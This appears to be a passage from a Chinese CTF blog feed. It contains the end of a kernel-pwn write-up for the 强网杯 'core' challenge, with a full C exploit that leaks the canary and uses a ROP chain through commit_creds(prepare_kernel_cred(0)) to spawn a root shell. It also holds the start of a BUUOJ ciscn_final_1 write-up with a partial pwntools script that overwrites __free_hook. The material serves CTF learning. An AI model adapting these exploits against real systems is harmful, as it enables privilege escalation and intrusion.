&amp;name, (unsigned __int16)a1);</code>中长度是<code>(unsigned __int16)a1)</code>，最大可为0xFFFF，从而存在栈溢出。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">_int64 __fastcall core_copy_func(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">    __int64 result; &#x2F;&#x2F; rax</span><br><span class="line">    __int64 v3; &#x2F;&#x2F; [rsp+0h] [rbp-50h]</span><br><span class="line">    unsigned __int64 v4; &#x2F;&#x2F; [rsp+40h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">    v4 &#x3D; __readgsqword(0x28u);</span><br><span class="line">    printk(&amp;unk_215, a2);</span><br><span class="line">    if ( a1 &gt; 63 )</span><br><span class="line">    &#123;</span><br><span class="line">        printk(&amp;unk_2A1, a2);</span><br><span class="line">        result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        result &#x3D; 0LL;</span><br><span class="line">        qmemcpy(&amp;v3, &amp;name, (unsigned __int16)a1);</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>同时驱动模块提供<code>core_write</code>回调函数，接受用户态的输入储存到变量<code>name</code>中：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    v3 = a3;</span><br><span class="line">    printk(&amp;unk_215, a2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, v3) )</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3;</span><br><span class="line">    printk(&amp;unk_230, a2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>首先在<code>core.cpio</code>解包出的文件<code>init</code>中，patch自动关机的命令<code>poweroff -d 120 -f &amp;</code>为<code>poweroff -d 0 -f &amp;</code>再重新打包。</li><li>通过<code>0x6677889C</code>功能设置<code>off</code>为0x40，从而<code>&amp;v6+off</code>的位置指向栈上的canary，再通过<code>0x6677889B</code>功能leak出canary以及PIE。</li><li>然后通过保存当前用户态的寄存器信息，在从内核态提权返回的时候用来恢复寄存器的信息。 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">            <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">            <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">            <span class="string">"pushf;"</span></span><br><span class="line">            <span class="string">"pop user_rflags;"</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>之后通过<code>write(fd, rop, 0x100)</code>布置rop chain到<code>name</code>中去： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+----------------+ 0</span><br><span class="line">|      fill      |</span><br><span class="line">..................</span><br><span class="line">|      fill      |</span><br><span class="line">|      fill      |</span><br><span class="line">+----------------+ +0x40</span><br><span class="line">|     canary     |</span><br><span class="line">+----------------+</span><br><span class="line">|      fill      |</span><br><span class="line">+----------------+</span><br><span class="line">|   priviledge   |  &#x3D;&#x3D;&gt; commit_creds(perpare_kernel_cred(0));</span><br><span class="line">+----------------+</span><br><span class="line">|     swapgs     |  &#x3D;&#x3D;&gt; swapgs; pop rbp; ret;</span><br><span class="line">+----------------+</span><br><span class="line">|      fill      |</span><br><span class="line">+----------------+</span><br><span class="line">|      iret      |  &#x3D;&#x3D;&gt; iret</span><br><span class="line">+----------------+</span><br><span class="line">|    getshell    |  &#x3D;&#x3D;&gt; system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">+----------------+</span><br><span class="line">|    user_cs     |</span><br><span class="line">+----------------+</span><br><span class="line">|   user_rflags  |</span><br><span class="line">+----------------+</span><br><span class="line">|    user_sp     |</span><br><span class="line">+----------------+</span><br><span class="line">|    user_ss     |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure></li><li>最后通过<code>0x6677889A</code>触发栈溢出，get root shell。</li><li>此外，因为<code>commit_creds</code>和<code>prepare_kernel_cred</code>是内核函数，其地址存放在<code>/proc/kallsyms</code>中，但是非root用户在直接读取的时候是读不到地址数据的（全是0）。而注意到<code>init</code>中: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br></pre></td></tr></table></figure> 把<code>/proc/kallsyms</code>拷贝到<code>/tmp/kallsyms</code>中去了从而可以读到函数地址，在执行<code>poc</code>的时候手动输入即可。</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_READ 0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_OFF 0x6677889C</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_WRITE 0x6677889A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="keyword">size_t</span> commit_cred;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetAddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] Input the address of prepare_kernel_cred: "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%lx"</span>, &amp;prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] Input the address of commit_cred: "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%lx"</span>, &amp;commit_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">priviledge_escalation</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *(*pkc)(<span class="keyword">void</span> *) = (<span class="keyword">void</span> *)prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">int</span> (*cc)(<span class="keyword">void</span> *) = (<span class="keyword">void</span> *)commit_cred;</span><br><span class="line"></span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">            <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">            <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">            <span class="string">"pushf;"</span></span><br><span class="line">            <span class="string">"pop user_rflags;"</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Root!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Failed!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> canary[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">size_t</span> ret_addr, swapgs_addr, iret_addr;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get prepare_kernel_cred and commit_cred</span></span><br><span class="line">    GetAddr(&amp;prepare_kernel_cred, &amp;commit_cred);</span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">"/proc/core"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak canary</span></span><br><span class="line">    <span class="built_in">memset</span>(canary, <span class="number">101</span>, <span class="number">0</span>);</span><br><span class="line">    ioctl(fd, COM_OFF, <span class="number">0x40</span>);</span><br><span class="line">    ioctl(fd, COM_READ, canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Read finished.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get ret_addr, iret_addr</span></span><br><span class="line">    ret_addr = *(<span class="keyword">size_t</span> *)(canary + <span class="number">0x10</span>);</span><br><span class="line">    swapgs_addr = ret_addr - <span class="number">0xc5</span>;</span><br><span class="line">    iret_addr = prepare_kernel_cred - <span class="number">311838</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] ret_addr: %lx\n"</span>, ret_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] swapgs_addr: %lx\n"</span>, swapgs_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] iret_addr: %lx\n"</span>, iret_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// save status</span></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set name</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = *(<span class="keyword">size_t</span> *)canary;</span><br><span class="line">    rop[i++] = <span class="number">0xdeadbeefbeefdead</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)&amp;priviledge_escalation;</span><br><span class="line">    rop[i++] = swapgs_addr;  <span class="comment">// gadget swapgs_pop_rbp_ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>; <span class="comment">// rbp;</span></span><br><span class="line">    rop[i++] = iret_addr;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)&amp;getshell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">write</span>(fd, rop, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Write finished.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write rop</span></span><br><span class="line">    ioctl(fd, COM_WRITE, <span class="number">0xff00000000000100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc pwn_core.c -masm=intel -static -lutil -o pwn_core</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>总的来说这还是一道比较简单的题，ROP的利用思路也看起来相对简单，有些保护比如<code>smep</code>没开导致可以直接在内核态执行用户代码，所以布置rop相对轻松。</li><li>做kernel pwn rop的基本思路基本可以从这道题中了解了，主要是通过各种方法提权然后返回用户态开shell，尽管方式各异。</li><li>复现core算是开了一个小头，最近看了有一定数量的kernel pwn的分析文章了，但是很多都是看看而已还没动手复现过，只是留了个印象方便之后复现的时候过于生疏。</li><li>总之kernel pwn还是需要一些kernel的知识的，要学的东西还很多，慢慢学吧。</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/#ioctl" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/#ioctl</a></li><li><a href="https://www.anquanke.com/post/id/201043" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201043</a></li><li><a href="https://www.anquanke.com/post/id/172216" target="_blank" rel="noopener">https://www.anquanke.com/post/id/172216</a></li><li><a href="https://www.jianshu.com/p/8d950a9d8974" target="_blank" rel="noopener">https://www.jianshu.com/p/8d950a9d8974</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;早就该学习kernel pwn，否则得被时代抛弃了。先从简单的入手吧，&lt;del&gt;复现几道以前的ROP赛题&lt;/del&gt;目前只找到强网杯的题目，顺便从中学习一点kernel的基础知识。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reproduction" scheme="https://n0nop.github.io/categories/Reproduction/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
      <category term="kernel" scheme="https://n0nop.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ 刷题记录(一)</title>
    <link href="https://n0nop.github.io/2020/05/05/BUUOJ-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E4%B8%80/"/>
    <id>https://n0nop.github.io/2020/05/05/BUUOJ-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E4%B8%80/</id>
    <published>2020-05-05T15:37:27.000Z</published>
    <updated>2020-05-08T06:52:00.091Z</updated>
    
    <content type="html"><![CDATA[<p>pwnable.tw做不动了，发现BUUOJ上的题目挺多的，加上想刷一刷2019国赛的题目，这两天断断续续地做了几道题目，简单记录一下。<br><br><b>更新：10道刷完，有些题目还是挺有意思的。</b></p><a id="more"></a><h1 id="ciscn-final-1"><a href="#ciscn-final-1" class="headerlink" title="ciscn_final_1"></a>ciscn_final_1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>binary内部实现了一个虚拟机，有自己的指令集，其实逻辑搞清楚了问题不大（虽然我看了蛮久），主要是写脚本的时候要花点时间。（本地给的glibc2.23的环境，打通了；但是远程给的glibc2.27，在调试的时候发现<code>mmap</code>没有触发，也就是说分配出来的内存空间没有紧挨着libc，结果没法打通。讲道理不应该啊，两个版本的libc这里的逻辑不是一样吗，阈值应该都是128k啊。）</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>16 bits的机器码，大端数据，高4 bits是opcode，后面要么是寄存器的index，要么是立即数，要么是标志位。若高4 bits是0xF，根据低8 bits的值，对应了一些输出，停机，退出指令。（binary的database不小心删了，就不贴反汇编的代码了）</li><li>关键在于利用其中的<code>opcode==6</code>和<code>opcode==7</code>的两条指令，分别是对应访问内存以及写入内存，且地址是32 bits，说明可以相对内存溢出。</li><li>由于内存是分配在堆上的，而且申请的<code>size==0x1FFFE</code>，是会通过<code>mmap</code>申请的，而且位置正好紧挨着libc且位于上方。所以通过上述的根据偏移访问内存和读写内存可以操作到libc的位置上。</li><li>所以根据以上，可以通过溢出，根据偏移读写libc。</li><li>首先读出<code>_IO_list_all</code>位置存的<code>_IO_2_1_stderr_</code>的地址，从而leak libc。</li><li>再向<code>__free_hook</code>写<code>system</code></li><li>最后在输入指令的时候，在内存开头写入”/bin/sh”，并且在虚拟机开始执行的地址处(偏移为0x6000=0x3000 *sizeof(_WORD))写入<code>exit</code>指令触发<code>free</code>内存的操作，从而getshell。</li><li>以上步骤可以通过<code>halt</code>分隔，因为<code>halt</code>可以重新接受输入指令再次执行。</li><li><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addi</span><span class="params">(reg_dst, reg_src, imm)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(imm &lt;= <span class="number">0xF</span>)</span><br><span class="line">    binary_str = <span class="string">"0001"</span></span><br><span class="line">    binary_str += bin(reg_dst)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += <span class="string">"1"</span></span><br><span class="line">    binary_str += bin(imm)[<span class="number">2</span>:].rjust(<span class="number">5</span>, <span class="string">"0"</span>)</span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_code</span><span class="params">(reg_dst, reg_src_1, reg_src_2)</span>:</span></span><br><span class="line">    binary_str = <span class="string">"0110"</span></span><br><span class="line">    binary_str += bin(reg_dst)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src_1)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src_2)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += <span class="string">"000"</span></span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_code</span><span class="params">(reg_dst, reg_src_1, reg_src_2)</span>:</span></span><br><span class="line">    binary_str = <span class="string">"0111"</span></span><br><span class="line">    binary_str += bin(reg_dst)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src_1)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src_2)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += <span class="string">"000"</span></span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(reg_dst, imm)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(imm &lt;= <span class="number">0xFF</span>)</span><br><span class="line">    binary_str = <span class="string">"0010"</span></span><br><span class="line">    binary_str += bin(reg_dst)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(imm)[<span class="number">2</span>:].rjust(<span class="number">9</span>, <span class="string">"0"</span>)</span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(reg_src, imm)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(imm &lt;= <span class="number">0xFF</span>)</span><br><span class="line">    binary_str = <span class="string">"0011"</span></span><br><span class="line">    binary_str += bin(reg_src)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(imm)[<span class="number">2</span>:].rjust(<span class="number">9</span>, <span class="string">"0"</span>)</span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_reg0</span><span class="params">()</span>:</span></span><br><span class="line">    val = <span class="number">0xF021</span></span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">halt</span><span class="params">()</span>:</span></span><br><span class="line">    val = <span class="number">0xF025</span></span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">big_endian</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> chr(val &gt;&gt; <span class="number">8</span>) + chr(val &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 